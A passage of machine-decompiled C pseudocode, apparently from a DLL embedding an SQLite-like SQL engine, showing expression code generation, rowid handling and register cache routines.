  return v3;
}

//----- (10076904) --------------------------------------------------------
int __usercall sub_10076904@<eax>(char *a1@<eax>, char a2@<dl>)
{
  unsigned __int8 v3; // cl
  int v4; // ecx
  int v5; // ecx
  int v6; // ecx
  int v7; // ecx
  bool v8; // zf

  if ( a2 == 98 )
    return 1;
  while ( *a1 == -99 || *a1 == -100 )
    a1 = (char *)*((_DWORD *)a1 + 2);
  v3 = *a1;
  if ( *a1 == -124 )
    v3 = a1[35];
  v4 = v3 - 94;
  if ( v4 )
  {
    v5 = v4 - 35;
    if ( v5 )
    {
      v6 = v5 - 1;
      if ( !v6 )
      {
        v8 = a2 == 101;
        return v8 || a2 == 99;
      }
      v7 = v6 - 1;
      if ( !v7 )
        return 1;
      if ( v7 != 21 || *((__int16 *)a1 + 14) >= 0 )
        return 0;
    }
    v8 = a2 == 100;
    return v8 || a2 == 99;
  }
  return a2 == 97;
}

//----- (10076961) --------------------------------------------------------
BOOL __cdecl sub_10076961(unsigned __int8 *a1)
{
  return !sub_100593BE(a1, (unsigned __int8 *)aRowid)
      || !sub_100593BE(a1, (unsigned __int8 *)aRowid_0)
      || sub_100593BE(a1, (unsigned __int8 *)aOid) == 0;
}

//----- (1007699F) --------------------------------------------------------
BOOL __usercall sub_1007699F@<eax>(int *a1@<eax>)
{
  int v2; // ecx
  int v3; // ecx
  int v4; // eax

  if ( !a1 )
    return 0;
  if ( a1[7] )
    return 0;
  if ( (*((_BYTE *)a1 + 6) & 5) != 0 )
    return 0;
  if ( a1[10] )
    return 0;
  if ( a1[3] )
    return 0;
  v2 = a1[2];
  if ( *(_WORD *)v2 != 1 )
    return 0;
  if ( *(_DWORD *)(v2 + 24) )
    return 0;
  v3 = *(_DWORD *)(v2 + 20);
  if ( !v3 )
    return 0;
  if ( (*(_BYTE *)(v3 + 34) & 0x10) != 0 )
    return 0;
  v4 = *a1;
  return *(_DWORD *)v4 == 1 && ***(_BYTE ***)(v4 + 12) == 0x98;
}

//----- (100769EF) --------------------------------------------------------
int __usercall sub_100769EF@<eax>(int *a1@<eax>, int a2, int *a3)
{
  int v3; // ebx
  int *v5; // esi
  int v6; // esi
  int v7; // ebx
  char v9; // al
  int v10; // esi
  int v11; // ebx
  int v12; // eax
  int v13; // [esp+14h] [ebp-2Ch]
  int *v14; // [esp+1Ch] [ebp-24h]
  int v15; // [esp+20h] [ebp-20h]
  int v16; // [esp+24h] [ebp-1Ch]
  int v17; // [esp+28h] [ebp-18h]
  BOOL v18; // [esp+28h] [ebp-18h]
  int v19; // [esp+2Ch] [ebp-14h]
  int *v20; // [esp+30h] [ebp-10h]
  int v21; // [esp+34h] [ebp-Ch]
  int *v22; // [esp+38h] [ebp-8h]
  int v23; // [esp+3Ch] [ebp-4h]
  unsigned __int16 *v24; // [esp+3Ch] [ebp-4h]

  v3 = a2;
  v19 = a1[17];
  a1[17] = v19 + 1;
  v23 = 0;
  if ( (*(_WORD *)(a2 + 2) & 0x800) != 0 )
    v5 = *(int **)(a2 + 16);
  else
    v5 = 0;
  if ( !a1[16] && sub_1007699F(v5) )
  {
    v16 = *a1;
    v17 = **(_DWORD **)(*v5 + 12);
    v21 = *(__int16 *)(v17 + 28);
    v22 = sub_1007C271(a1);
    v20 = *(int **)(v5[2] + 20);
    v15 = sub_1005855F(v16, v20[17]);
    sub_1006CAC0(a1, v15);
    sub_10069AEC((int)a1, v20[6], v15, 0, v20[1]);
    if ( v21 < 0 )
    {
      v6 = ++a1[18];
      v7 = sub_1005ABD1((int)v22, 26, v6);
      sub_1005ABE8((int)v22, 7, 1, v6);
      sub_100791F0((int)v20, a1, v19, v15, 38);
      v23 = 1;
      sub_1005AE20(v7, (int)v22);
LABEL_8:
      *(_DWORD *)(a2 + 24) = v19;
      return v23;
    }
    v14 = sub_10075A91(*(_DWORD *)(a2 + 8), v17, a1);
    v9 = sub_10075A58(a2);
    v18 = *(_BYTE *)(v20[4] + 24 * v21 + 22) == v9 || v9 == 98;
    v10 = v20[5];
    if ( v10 )
    {
      while ( !v23 )
      {
        if ( !v18 )
          goto LABEL_27;
        if ( **(_DWORD **)(v10 + 8) == v21
          && sub_10069699(v16, *(_BYTE *)(*(_DWORD *)(*(_DWORD *)(v16 + 8) + 12) + 73), **(_BYTE ***)(v10 + 44), 0) == v14
          && (a3 || *(_DWORD *)(v10 + 4) == 1 && *(_BYTE *)(v10 + 24)) )
        {
          v11 = ++a1[18];
          v24 = (unsigned __int16 *)sub_1006CBB6(a1, (_DWORD *)v10);
          v13 = sub_1005ABD1((int)v22, 26, v11);
          sub_1005ABE8((int)v22, 7, 1, v11);
          sub_1005AC02(v22, 38, v19, *(_DWORD *)(v10 + 20), v15, v24, (_BYTE *)0xFFFFFFF0);
          v23 = 3;
          sub_1005AE20(v13, (int)v22);
          if ( a3 )
          {
            if ( !*(_BYTE *)(v20[4] + 24 * v21 + 20) )
              *a3 = ++a1[18];
          }
        }
        v10 = *(_DWORD *)(v10 + 32);
        if ( !v10 )
        {
          if ( v23 )
            goto LABEL_8;
          goto LABEL_27;
        }
      }
      goto LABEL_8;
    }
LABEL_27:
    v3 = a2;
  }
  v12 = 0;
  v23 = 2;
  if ( a3 )
  {
    v12 = ++a1[18];
    *a3 = v12;
  }
  else if ( *(__int16 *)(*(_DWORD *)(v3 + 8) + 28) < 0 && (*(_WORD *)(v3 + 2) & 0x800) == 0 )
  {
    v23 = 1;
  }
  sub_10076C71(a1, v3, v12, v23 == 1);
  return v23;
}

//----- (10076C71) --------------------------------------------------------
int __usercall sub_10076C71@<eax>(int *a1@<ebx>, int a2, int a3, int a4)
{
  _DWORD *v4; // eax
  int v6; // esi
  int v7; // esi
  bool v8; // zf
  _DWORD *v9; // eax
  int v10; // ecx
  unsigned __int8 *v11; // esi
  int v12; // eax
  int *v13; // esi
  int *v14; // ecx
  bool v15; // cc
  int v16; // esi
  int v17; // esi
  int v18; // eax
  int v19; // [esp-8h] [ebp-5Ch]
  int Src[4]; // [esp+8h] [ebp-4Ch] BYREF
  char v21; // [esp+18h] [ebp-3Ch] BYREF
  char v22; // [esp+19h] [ebp-3Bh]
  int v23; // [esp+1Ch] [ebp-38h]
  int v24; // [esp+20h] [ebp-34h]
  int v25; // [esp+24h] [ebp-30h]
  int v26; // [esp+28h] [ebp-2Ch]
  int v27; // [esp+2Ch] [ebp-28h] BYREF
  int v28; // [esp+30h] [ebp-24h]
  int v29; // [esp+34h] [ebp-20h]
  int v30; // [esp+38h] [ebp-1Ch]
  int *v31; // [esp+3Ch] [ebp-18h]
  int v32; // [esp+40h] [ebp-14h]
  int v33; // [esp+44h] [ebp-10h]
  int v34; // [esp+48h] [ebp-Ch]
  unsigned __int16 v35; // [esp+4Fh] [ebp-5h] BYREF

  v32 = 0;
  v28 = 0;
  v4 = sub_1007C271(a1);
  v34 = (int)v4;
  if ( !v4 )
    return 0;
  ++a1[21];
  if ( (*(_BYTE *)(a2 + 2) & 0x20) == 0 && !a1[107] )
  {
    v6 = ++a1[18];
    sub_1005ABD1((int)v4, 26, v6);
    v32 = sub_1005ABE8(v34, 7, 1, v6);
  }
  if ( *(_BYTE *)a2 == 72 )
  {
    v11 = *(unsigned __int8 **)(a2 + 8);
    if ( a3 )
      sub_1005ABE8(v34, 10, 0, a3);
    LOBYTE(v35) = sub_100758D6(v11);
    *(_DWORD *)(a2 + 24) = a1[17]++;
    v26 = sub_1005ABE8(v34, 40, *(_DWORD *)(a2 + 24), a4 == 0);
    memset(Src, 0, sizeof(Src));
    v8 = (*(_WORD *)(a2 + 2) & 0x800) == 0;
    HIWORD(Src[1]) = 1;
    if ( v8 )
    {
      v13 = *(int **)(a2 + 16);
      if ( v13 )
      {
        if ( !(_BYTE)v35 )
          LOBYTE(v35) = 98;
        Src[3] = (int)sub_1007596F(*(unsigned __int8 **)(a2 + 8), a1);
        v29 = sub_10078A55((int)a1);
        v33 = sub_10078A55((int)a1);
        sub_1005ABE8(v34, 10, 0, v33);
        v14 = (int *)v13[3];
        v15 = *v13 <= 0;
        v30 = *v13;
        v31 = v14;
        if ( !v15 )
        {
          do
          {
            v16 = *v31;
            if ( v32 )
              sub_10076851(*v31);
            if ( a4 && sub_1007687B(v16, &v27) )
            {
              sub_1005AB66(v34, 55, *(_DWORD *)(a2 + 24), v33, v27);
            }
            else
            {
              v17 = sub_10077418(a1, v16, v29);
              if ( a4 )
              {
                sub_1005ABE8(v34, 21, v17, *(_DWORD *)(v34 + 12) + 2);
                sub_1005AB66(v34, 54, *(_DWORD *)(a2 + 24), v33, v17);
              }
              else
              {
                sub_1005AC02((int *)v34, 30, v17, 1, v33, &v35, (_BYTE *)1);
                sub_100772A8((int)a1, 1, v17);
                sub_1005ABE8(v34, 67, *(_DWORD *)(a2 + 24), v33);
              }
            }
            --v30;
            v31 += 5;
          }
          while ( v30 > 0 );
        }
        v18 = sub_10078A70((int)a1, v29);
        sub_10078A70(v18, v33);
      }
    }
    else
    {
      v23 = *(_DWORD *)(a2 + 24);
      v22 = v35;
      v19 = *(_DWORD *)(a2 + 16);
      v21 = 7;
      v24 = 0;
      v25 = 0;
      if ( sub_1007E480(a1, v19, &v21) )
        return 0;
      v12 = **(_DWORD **)(a2 + 16);
      if ( v12 && *(int *)v12 > 0 )
        Src[3] = (int)sub_10075A91(*(_DWORD *)(a2 + 8), **(_DWORD **)(v12 + 12), a1);
    }
    if ( !a4 )
      sub_1005AFA8(v26, (int *)v34, (unsigned __int16 *)Src, (_BYTE *)0xFFFFFFFA);
  }
  else
  {
    v7 = *(_DWORD *)(a2 + 16);
    v23 = ++a1[18];
    v8 = *(_BYTE *)a2 == 116;
    v24 = 0;
    v25 = 0;
    v28 = v7;
    v22 = 0;
    if ( v8 )
    {
      v21 = 6;
      sub_1005ABE8(v34, 10, 0, v23);
    }
    else
    {
      v21 = 3;
      sub_1005ABE8(v34, 7, 0, v23);
    }
    sub_10075FD8(*a1, *(_DWORD *)(v7 + 40));
    v9 = sub_10075DC6((const void **)&off_100FE5E8, 0, a1, 129, 0);
    v10 = v28;
    *(_DWORD *)(v28 + 40) = v9;
    if ( sub_1007E480(a1, v10, &v21) )
      return 0;
    v28 = v23;
  }
  if ( v32 )
    sub_1005AE20(v32 - 1, v34);
  sub_100772D1((int)a1);
  return v28;
}
// 10077418: using guessed type _DWORD __cdecl sub_10077418(_DWORD, _DWORD, _DWORD);
// 1007E480: using guessed type _DWORD __cdecl sub_1007E480(_DWORD, _DWORD, _DWORD);
// 100FE5E8: using guessed type char *off_100FE5E8;

//----- (10076F92) --------------------------------------------------------
int __usercall sub_10076F92@<eax>(int *a1@<eax>, int a2, int a3, int a4)
{
  int *v5; // ebx
  char v6; // al
  int v7; // esi
  int v9; // esi
  int v10; // eax
  int v12; // [esp-8h] [ebp-24h]
  int v13; // [esp+Ch] [ebp-10h]
  int v14; // [esp+Ch] [ebp-10h]
  int v15; // [esp+10h] [ebp-Ch]
  int v16; // [esp+14h] [ebp-8h] BYREF
  char v17; // [esp+1Bh] [ebp-1h] BYREF
  int v18; // [esp+24h] [ebp+8h]

  v16 = 0;
  v5 = (int *)a1[3];
  v13 = sub_100769EF(a1, a2, &v16);
  v6 = sub_10075A58(a2);
  ++a1[21];
  v17 = v6;
  v7 = sub_10078A55((int)a1);
  v15 = v7;
  sub_10077F49(*(_DWORD *)(a2 + 8));
  sub_1005ABE8((int)v5, 73, v7, a4);
  if ( v13 == 1 )
  {
    sub_1005ABE8((int)v5, 21, v7, a3);
    sub_1005AB66((int)v5, 51, *(_DWORD *)(a2 + 24), a3, v7);
  }
  else
  {
    sub_1005AC02(v5, 29, v7, 1, 0, (unsigned __int16 *)&v17, (_BYTE *)1);
    if ( !v16 || a3 == a4 )
    {
      sub_1005AC32(v5, 48, *(_DWORD *)(a2 + 24), a3, v7, (unsigned __int16 *)1);
    }
    else
    {
      v12 = v7;
      v14 = sub_1005AC32(v5, 49, *(_DWORD *)(a2 + 24), 0, v12, (unsigned __int16 *)1);
      v18 = sub_1005ABD1((int)v5, 74, v16);
      v9 = sub_1005AC32(v5, 49, *(_DWORD *)(a2 + 24), 0, v16, (unsigned __int16 *)1);
      sub_1005ABE8((int)v5, 7, -1, v16);
      sub_1005AE20(v9, (int)v5);
      sub_1005ABE8((int)v5, 20, v16, 1);
      sub_1005AE20(v18, (int)v5);
      sub_1005ABE8((int)v5, 26, v16, a4);
      sub_1005ABE8((int)v5, 1, 0, a3);
      sub_1005AE20(v14, (int)v5);
      v7 = v15;
    }
  }
  v10 = sub_10078A70((int)a1, v7);
  return sub_100772D1(v10);
}
// 10077F49: using guessed type _DWORD __cdecl sub_10077F49(_DWORD);
// 10076F92: using guessed type int var_8;

//----- (1007710F) --------------------------------------------------------
_DWORD *__usercall sub_1007710F@<eax>(int *a1@<eax>, void *Src)
{
  _DWORD *v2; // eax
  _DWORD *v3; // esi

  v2 = sub_10059073(*a1, 8);
  v3 = v2;
  if ( v2 )
    memcpy(v2, Src, 8u);
  return v3;
}

//----- (10077136) --------------------------------------------------------
_BYTE *__usercall sub_10077136@<eax>(_BYTE *result@<eax>, int *a2, int a3, int a4)
{
  unsigned __int16 *v4; // eax
  double Src; // [esp+0h] [ebp-Ch] BYREF

  if ( result )
  {
    sub_100594F4(result, &Src);
    if ( a3 )
      Src = -Src;
    v4 = (unsigned __int16 *)sub_1007710F(a2, &Src);
    return (_BYTE *)sub_1005AC02(a2, 130, 0, a4, 0, v4, (_BYTE *)0xFFFFFFF4);
  }
  return result;
}
// 10077136: using guessed type double Src;

//----- (10077181) --------------------------------------------------------
_BYTE *__usercall sub_10077181@<eax>(int a1@<eax>, int *a2@<ebx>, int a3@<edi>, int a4)
{
  int v4; // eax
  char *v6; // esi
  unsigned __int16 *v7; // eax
  __int64 Src; // [esp+4h] [ebp-8h] BYREF

  if ( (*(_WORD *)(a1 + 2) & 0x400) != 0 )
  {
    v4 = *(_DWORD *)(a1 + 4);
    if ( a3 )
      v4 = -v4;
    return (_BYTE *)sub_1005ABE8((int)a2, 7, v4, a4);
  }
  else
  {
    v6 = *(char **)(a1 + 4);
    if ( sub_100598A1(v6, a3) )
    {
      sub_100597DB(v6, (int *)&Src);
      if ( a3 )
        Src = -Src;
      v7 = (unsigned __int16 *)sub_1007710F(a2, &Src);
      return (_BYTE *)sub_1005AC02(a2, 8, 0, a4, 0, v7, (_BYTE *)0xFFFFFFF3);
    }
    else
    {
      return sub_10077136(v6, a2, a3, a4);
    }
  }
}

//----- (1007720E) --------------------------------------------------------
int __usercall sub_1007720E@<eax>(int result@<eax>, int a2@<ecx>)
{
  unsigned __int8 v2; // dl

  if ( *(_BYTE *)(a2 + 8) )
  {
    v2 = *(_BYTE *)(result + 21);
    if ( v2 < 8u )
    {
      *(_DWORD *)(result + 4 * v2 + 24) = *(_DWORD *)(a2 + 16);
      ++*(_BYTE *)(result + 21);
    }
    *(_BYTE *)(a2 + 8) = 0;
  }
  return result;
}

//----- (10077230) --------------------------------------------------------
int *__usercall sub_10077230@<eax>(_DWORD *a1@<ecx>, int a2@<ebx>, int a3, int a4)
{
  int *result; // eax
  int v5; // edi
  int v6; // esi
  int v7; // esi
  int v8; // [esp+0h] [ebp-4h]

  result = (int *)*a1;
  if ( (*(_BYTE *)(*a1 + 12) & 2) == 0 )
  {
    v5 = 0;
    v6 = 0;
    result = a1 + 24;
    do
    {
      if ( !result[4] )
        goto LABEL_11;
      ++v6;
      result += 6;
    }
    while ( v6 < 10 );
    v8 = 0x7FFFFFFF;
    v7 = -1;
    result = a1 + 29;
    do
    {
      if ( *result < v8 )
      {
        v7 = v5;
        v8 = *result;
      }
      ++v5;
      result += 6;
    }
    while ( v5 < 10 );
    if ( v7 >= 0 )
    {
      result = &a1[6 * v7 + 24];
LABEL_11:
      result[3] = a1[21];
      *result = a3;
      result[1] = a4;
      result[4] = a2;
      *((_BYTE *)result + 8) = 0;
      result[5] = a1[22]++;
    }
  }
  return result;
}

//----- (100772A8) --------------------------------------------------------
int __usercall sub_100772A8@<eax>(int result@<eax>, int a2@<ecx>, int a3@<esi>)
{
  int v3; // edi
  int v4; // ecx
  int v5; // ebx
  int v6; // edx

  v3 = a3 + a2 - 1;
  v4 = result + 96;
  v5 = 10;
  do
  {
    v6 = *(_DWORD *)(v4 + 16);
    if ( v6 >= a3 && v6 <= v3 )
    {
      result = sub_1007720E(result, v4);
      *(_DWORD *)(v4 + 16) = 0;
    }
    v4 += 24;
    --v5;
  }
  while ( v5 );
  return result;
}
// 100772C4: variable 'v4' is possibly undefined

//----- (100772D1) --------------------------------------------------------
int __usercall sub_100772D1@<eax>(int result@<eax>)
{
  int v1; // ecx
  int v2; // esi

  --*(_DWORD *)(result + 84);
  v1 = result + 96;
  v2 = 10;
  do
  {
    if ( *(_DWORD *)(v1 + 16) )
    {
      if ( *(_DWORD *)(v1 + 12) > *(_DWORD *)(result + 84) )
      {
        result = sub_1007720E(result, v1);
        *(_DWORD *)(v1 + 16) = 0;
      }
    }
    v1 += 24;
    --v2;
  }
  while ( v2 );
  return result;
}
// 100772EE: variable 'v1' is possibly undefined

//----- (100772FA) --------------------------------------------------------
int __usercall sub_100772FA@<eax>(_DWORD *a1@<eax>, int a2, int a3, int a4, int a5)
{
  int *v6; // ebx
  _DWORD *v7; // ecx
  int v8; // edx
  _DWORD *i; // eax
  int v10; // edx
  _DWORD *v11; // ecx
  int v12; // esi

  v6 = (int *)a1[3];
  v7 = a1 + 24;
  v8 = 0;
  for ( i = a1 + 24; (int)i[4] <= 0 || *i != a4 || i[1] != a3; i += 6 )
  {
    if ( ++v8 >= 10 )
    {
      if ( a3 >= 0 )
      {
        if ( a2 )
        {
          sub_1005AB66((int)v6, (*(_BYTE *)(a2 + 34) & 0x10) != 0 ? 126 : 28, a4, a3, a5);
          sub_10084195(a3, v6, a2, a5);
        }
      }
      else
      {
        sub_1005ABE8((int)v6, 60, a4, a5);
      }
      sub_10077230(a1, a5, a4, a3);
      return a5;
    }
  }
  i[5] = a1[22]++;
  v10 = i[4];
  v11 = v7 + 2;
  v12 = 10;
  do
  {
    if ( v11[2] == v10 )
      *(_BYTE *)v11 = 0;
    v11 += 6;
    --v12;
  }
  while ( v12 );
  return i[4];
}

//----- (100773BA) --------------------------------------------------------
int __usercall sub_100773BA@<eax>(int result@<eax>)
{
  int v1; // ecx
  int v2; // esi

  v1 = result + 96;
  v2 = 10;
  do
  {
    if ( *(_DWORD *)(v1 + 16) )
    {
      result = sub_1007720E(result, v1);
      *(_DWORD *)(v1 + 16) = 0;
    }
    v1 += 24;
    --v2;
  }
  while ( v2 );
  return result;
}
// 100773CC: variable 'v1' is possibly undefined

//----- (100773D8) --------------------------------------------------------
int __usercall sub_100773D8@<eax>(int result@<eax>, int a2@<ebx>, int a3@<edi>, int a4)
{
  int v4; // esi
  int *v5; // ecx
  int v6; // edx

  v4 = result;
  if ( a3 != a4 )
  {
    sub_1005AB66(*(_DWORD *)(result + 12), 13, a3, a4, a2);
    v5 = (int *)(v4 + 112);
    v6 = 10;
    do
    {
      result = *v5;
      if ( *v5 >= a3 && result < a3 + a2 )
      {
        result = a4 + result - a3;
        *v5 = result;
      }
      v5 += 6;
      --v6;
    }
    while ( v6 );
  }
  return result;
}

//----- (10077418) --------------------------------------------------------
int __cdecl sub_10077418(int *a1, unsigned __int8 *a2, int a3)
{
  int *v3; // edx
  int *v4; // edi
  int v5; // eax
  unsigned int v7; // esi
  int v8; // eax
  int v9; // ecx
  char v10; // si
  int *v11; // eax
  int v12; // ecx
  const void *v13; // eax
  int *v14; // ecx
  int v15; // esi
  __int16 v16; // ax
  signed __int8 v17; // al
  int v18; // eax
  int v19; // esi
  int v20; // esi
  int v21; // edx
  int v22; // ecx
  unsigned __int8 **v23; // esi
  int v24; // edx
  unsigned __int8 *v25; // esi
  int v26; // eax
  int v27; // eax
  int v28; // eax
  int v29; // eax
  int v30; // ecx
  int v31; // eax
  int v32; // eax
  _BYTE *v33; // ebx
  int v34; // esi
  unsigned __int16 *v35; // eax
  _DWORD *v36; // eax
  int v37; // ecx
  int v38; // ebx
  int v39; // eax
  int v40; // eax
  int v41; // eax
  char v42; // al
  int v43; // edi
  unsigned __int8 *v44; // esi
  _DWORD *v45; // eax
  int v46; // ecx
  int v47; // esi
  _DWORD *v48; // eax
  int *v49; // esi
  int v50; // ebx
  int v51; // eax
  int v52; // [esp-1Ch] [ebp-B4h]
  int v53; // [esp-1Ch] [ebp-B4h]
  int *v54; // [esp+Ch] [ebp-8Ch]
  int v55; // [esp+10h] [ebp-88h]
  int v56; // [esp+10h] [ebp-88h]
  int v57; // [esp+10h] [ebp-88h]
  int v58; // [esp+10h] [ebp-88h]
  int v59; // [esp+14h] [ebp-84h]
  unsigned __int8 *v60; // [esp+14h] [ebp-84h]
  char v61; // [esp+14h] [ebp-84h]
  int v62; // [esp+14h] [ebp-84h]
  int v63; // [esp+18h] [ebp-80h]
  unsigned __int8 *v64; // [esp+1Ch] [ebp-7Ch]
  int v65; // [esp+1Ch] [ebp-7Ch]
  int v66; // [esp+1Ch] [ebp-7Ch]
  int i; // [esp+1Ch] [ebp-7Ch]
  const void *v68; // [esp+20h] [ebp-78h]
  int v69; // [esp+20h] [ebp-78h]
  unsigned __int8 *v70; // [esp+20h] [ebp-78h]
  int v71; // [esp+20h] [ebp-78h]
  int v72; // [esp+20h] [ebp-78h]
  int v73; // [esp+24h] [ebp-74h]
  int v74; // [esp+24h] [ebp-74h]
  int v75; // [esp+24h] [ebp-74h]
  int v76; // [esp+24h] [ebp-74h]
  _BYTE *v77; // [esp+24h] [ebp-74h]
  int v78; // [esp+24h] [ebp-74h]
  int v79; // [esp+28h] [ebp-70h]
  int v80; // [esp+28h] [ebp-70h]
  int v81; // [esp+2Ch] [ebp-6Ch] BYREF
  int *v82; // [esp+30h] [ebp-68h]
  int v83; // [esp+34h] [ebp-64h] BYREF
  int v84[12]; // [esp+38h] [ebp-60h] BYREF
  char v85; // [esp+68h] [ebp-30h] BYREF
  int *v86; // [esp+70h] [ebp-28h]
  int v87; // [esp+74h] [ebp-24h]

  v3 = a1;
  v4 = (int *)a1[3];
  v63 = a3;
  v5 = *a1;
  v54 = v4;
  v81 = 0;
  v83 = 0;
  v55 = v5;
  if ( !v4 )
    return 0;
  if ( !a2 )
    goto LABEL_53;
  v7 = *a2;
  if ( v7 > 0x62 )
  {
    switch ( *a2 )
    {
      case 0x74u:
        goto LABEL_119;
      case 0x81u:
        sub_10077181((int)a2, v4, 0, a3);
        goto LABEL_130;
      case 0x82u:
        sub_10077136(*((_BYTE **)a2 + 1), v4, 0, a3);
        goto LABEL_130;
      case 0x83u:
        v33 = (_BYTE *)(*((_DWORD *)a2 + 1) + 2);
        v34 = (int)(sub_10059297(v33) - 1);
        v35 = (unsigned __int16 *)sub_10059C8B(*v4, (int)v33, v34);
        sub_1005AC02(v4, 11, v34 / 2, a3, 0, v35, (_BYTE *)0xFFFFFFFF);
        goto LABEL_130;
      case 0x84u:
        v8 = *((_DWORD *)a2 + 6);
        goto LABEL_57;
      case 0x85u:
        if ( !*(_BYTE *)(*((_DWORD *)a2 + 1) + 1)
          && (v36 = sub_1005B0D5(-1, v4), *(_BYTE *)v36 == 12)
          && (v37 = v36[3], v37 + v36[1] == *((__int16 *)a2 + 14))
          && v37 + v36[2] == a3
          && !v36[4] )
        {
          v36[3] = v37 + 1;
        }
        else
        {
          sub_1005AB66((int)v4, 12, *((__int16 *)a2 + 14), a3, 1);
          v38 = *((_DWORD *)a2 + 1);
          if ( *(_BYTE *)(v38 + 1) )
            sub_1005AFA8(-1, v4, (unsigned __int16 *)v38, 0);
        }
        goto LABEL_130;
      case 0x92u:
        goto LABEL_75;
      case 0x97u:
      case 0x9Bu:
        v71 = 0;
        v42 = *(_BYTE *)(*(_DWORD *)(*(_DWORD *)(v5 + 8) + 12) + 73);
        v82 = 0;
        v61 = v42;
        if ( (*((_WORD *)a2 + 1) & 0x2000) != 0 )
        {
          v43 = 0;
          v66 = 0;
LABEL_87:
          v79 = 0;
          goto LABEL_88;
        }
        v43 = *((_DWORD *)a2 + 4);
        v66 = v43;
        if ( !v43 )
          goto LABEL_87;
        v79 = *(_DWORD *)v43;
LABEL_88:
        v44 = (unsigned __int8 *)*((_DWORD *)a2 + 1);
        v77 = sub_10059297(v44);
        v45 = sub_100697AC((size_t)v77, v79, v55, v44, v61, 0);
        v62 = (int)v45;
        if ( !v45 )
        {
          sub_10059320(a1, "unknown function: %.*s()", (int)v77, (const char *)v44);
          goto LABEL_130;
        }
        if ( (*((_BYTE *)v45 + 3) & 0x40) != 0 )
        {
          v59 = sub_1005AC63((int)v54);
          sub_10077F49(**(_DWORD **)(v66 + 12));
          if ( v79 > 1 )
          {
            v58 = 20;
            v72 = v79 - 1;
            do
            {
              sub_1005ABE8((int)v54, 74, a3, v59);
              sub_100772A8((int)a1, 1, a3);
              ++a1[21];
              sub_10077F49(*(_DWORD *)(v58 + *(_DWORD *)(v66 + 12)));
              sub_100772D1((int)a1);
              v58 += 20;
              --v72;
            }
            while ( v72 );
          }
          goto LABEL_128;
        }
        if ( v43 )
        {
          v78 = sub_10078AA4(a1, v79);
          v47 = v46;
          ++*(_DWORD *)(v46 + 84);
          sub_10078052((int *)v43, v46, v78, 1);
          sub_100772D1(v47);
        }
        else
        {
          v78 = 0;
        }
        if ( v79 < 2 || (a2[2] & 0x80u) == 0 )
        {
          if ( v79 <= 0 )
          {
LABEL_106:
            v49 = v82;
            v50 = 0;
            for ( i = 0; i < v79; v50 += 20 )
            {
              if ( i < 32 )
              {
                sub_10076851(*(_DWORD *)(v50 + *(_DWORD *)(v43 + 12)));
                v71 |= 1 << i;
              }
              if ( (*(_BYTE *)(v62 + 3) & 8) != 0 && !v49 )
                v49 = sub_1007596F(*(unsigned __int8 **)(*(_DWORD *)(v43 + 12) + v50), a1);
              ++i;
            }
            if ( (*(_BYTE *)(v62 + 3) & 8) != 0 )
            {
              if ( !v49 )
                v49 = *(int **)(v55 + 44);
              sub_1005AC02(v54, 17, 0, 0, 0, (unsigned __int16 *)v49, (_BYTE *)0xFFFFFFFC);
            }
            sub_1005AC02(v54, 18, v71, v78, a3, (unsigned __int16 *)v62, (_BYTE *)0xFFFFFFFB);
            sub_1005AE0E((int)v54, v79);
            if ( v79 )
              sub_10078AC8((int)a1, v78, v79);
            goto LABEL_130;
          }
          v48 = sub_1007176E(**(_DWORD **)(v43 + 12), v55, (_BYTE **)v62, v79);
        }
        else
        {
          v48 = sub_1007176E(*(_DWORD *)(*(_DWORD *)(v43 + 12) + 20), v55, (_BYTE **)v62, v79);
        }
        v62 = (int)v48;
        goto LABEL_106;
      case 0x98u:
        goto LABEL_60;
      case 0x99u:
        v41 = *((_DWORD *)a2 + 9);
        if ( !v41 )
        {
          sub_10059320(a1, "misuse of aggregate: %s()", *((const char **)a2 + 1));
          goto LABEL_130;
        }
        v8 = *(_DWORD *)(16 * *((__int16 *)a2 + 15) + *(_DWORD *)(v41 + 32) + 8);
        goto LABEL_57;
      case 0x9Au:
        v30 = *((_DWORD *)a2 + 9);
        v31 = *(_DWORD *)(v30 + 16) + 24 * *((__int16 *)a2 + 15);
        if ( !*(_BYTE *)v30 )
        {
          v8 = *(_DWORD *)(v31 + 16);
          goto LABEL_57;
        }
        if ( *(_BYTE *)(v30 + 1) )
        {
          sub_1005AB66((int)v4, 28, *(_DWORD *)(v30 + 4), *(_DWORD *)(v31 + 12), a3);
          goto LABEL_130;
        }
LABEL_60:
        v32 = *((_DWORD *)a2 + 6);
        if ( v32 >= 0 )
          v8 = sub_100772FA(a1, *((_DWORD *)a2 + 10), *((__int16 *)a2 + 14), v32, a3);
        else
          v8 = a1[20] + *((__int16 *)a2 + 14);
        goto LABEL_57;
      case 0x9Cu:
        v39 = *((_DWORD *)a2 + 2);
        if ( *(_BYTE *)v39 == 0x82 )
        {
          sub_10077136(*(_BYTE **)(v39 + 4), v4, 1, a3);
        }
        else if ( *(_BYTE *)v39 == 0x81 )
        {
          sub_10077181(v39, v4, 1, a3);
        }
        else
        {
          v81 = sub_10078A55((int)a1);
          sub_1005ABE8((int)v4, 7, 0, v81);
          v40 = sub_10077F0E(&v83, (int)a1, *((_DWORD *)a2 + 2));
          sub_1005AB66((int)v4, 87, v40, v81, a3);
        }
        v8 = a3;
        goto LABEL_57;
      case 0x9Du:
        goto LABEL_13;
      default:
        goto LABEL_21;
    }
  }
  if ( v7 == 98 )
  {
LABEL_53:
    sub_1005ABE8((int)v4, 10, 0, a3);
    goto LABEL_130;
  }
  if ( *a2 > 0x46u )
  {
    if ( *a2 > 0x50u )
    {
      if ( *a2 >= 0x52u )
      {
        if ( *a2 <= 0x5Bu )
          goto LABEL_52;
        if ( v7 == 93 )
        {
LABEL_51:
          v28 = sub_10077F0E(&v81, (int)a1, *((_DWORD *)a2 + 2));
          v63 = a3;
          sub_1005ABE8((int)v4, v7, v28, a3);
          goto LABEL_130;
        }
        if ( v7 == 94 )
        {
          sub_1005AC02(v4, 94, 0, a3, 0, *((unsigned __int16 **)a2 + 1), 0);
          goto LABEL_130;
        }
      }
LABEL_21:
      v11 = (int *)*((_DWORD *)a2 + 4);
      v12 = v11[3];
      v64 = 0;
      v82 = (int *)*v11;
      v56 = v12;
      v59 = sub_1005AC63((int)v4);
      v13 = (const void *)*((_DWORD *)a2 + 2);
      v68 = v13;
      if ( v13 )
      {
        qmemcpy(v84, v13, sizeof(v84));
        v84[6] = sub_10077F0E(&v81, (int)a1, (int)v13);
        v86 = v84;
        LOBYTE(v84[0]) = -124;
        v85 = 76;
        v64 = (unsigned __int8 *)&v85;
      }
      if ( (int)v82 > 0 )
      {
        v14 = (int *)v56;
        v82 = (int *)((((unsigned int)v82 - 1) >> 1) + 1);
